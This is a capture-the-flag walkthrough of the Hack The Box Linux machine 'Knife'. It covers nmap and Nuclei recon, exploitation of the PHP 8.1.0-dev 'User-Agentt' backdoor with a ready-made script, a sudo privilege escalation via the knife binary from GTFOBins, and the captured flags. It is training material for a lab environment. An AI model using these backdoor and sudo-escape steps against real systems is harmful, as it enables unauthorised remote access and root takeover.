---
title: "HTB: Knife"
date: 2023-06-15
draft: false
os: "Linux"
difficulty: "Easy"
platform: "HTB"
aliases: ["/posts/htb/knife/"]
tags:
  - htb
  - easy
  - linux
  - php-backdoor
  - gtfobins
categories:
  - walkthrough
---

{{< box-info name="Knife" os="Linux" difficulty="Easy" ip="10.129.44.1" platform="HTB" >}}

---

## Recon

### Nmap

```bash
nmap -sC -sV -oN nmap/initial 10.129.44.1
```

{{< collapse title="Nmap output" >}}
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd 2.4.6
```
{{< /collapse >}}

**OS**: Linux (Ubuntu, kernel 5.4.0-80-generic)

---

## Enumeration

### Port 80 - Web App

Running Nuclei against the target immediately flags something critical:

```bash
[php-zerodium-backdoor-rce] [http] [critical] http://10.129.44.1
```

That's a big red flag. The server is running **PHP 8.1.0-dev** which contains a backdoor planted by attackers in the PHP source code repository.

---

## Foothold

### PHP 8.1.0-dev Backdoor RCE

Researching `php-zerodium-backdoor-rce` leads to [this writeup](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/) and an ExploitDB entry.

The backdoor allows arbitrary code execution via a crafted `User-Agentt` header (note the double `t`). There are ready-made exploits available -- just point and shoot:

```bash
python3 exploit.py http://10.129.44.1
```

We land a shell as `james`.

---

## Privilege Escalation

### GTFOBins - knife

Checking sudo permissions:

{{< terminal title="james@knife" >}}
$ sudo -l
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
{{< /terminal >}}

`knife` is a Chef infrastructure tool and it's on [GTFOBins](https://gtfobins.github.io/gtfobins/knife/). Instant root:

```bash
sudo knife exec -E 'exec "/bin/bash"'
```

---

## Proof

{{< terminal title="root@knife" >}}
root@knife:/home/james# cat user.txt
ba62e576a2e7e468eb51b8bf13be1301
root@knife:/home/james# cat /root/root.txt
8a29936c83b58483940c3765b3792ff9
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- Always check response headers and run Nuclei -- the PHP backdoor was immediately flagged
- `sudo -l` is always the first privesc check -- GTFOBins makes it trivial when a listed binary is available
- This box took ~30 minutes, very straightforward attack chain
{{< /callout >}}
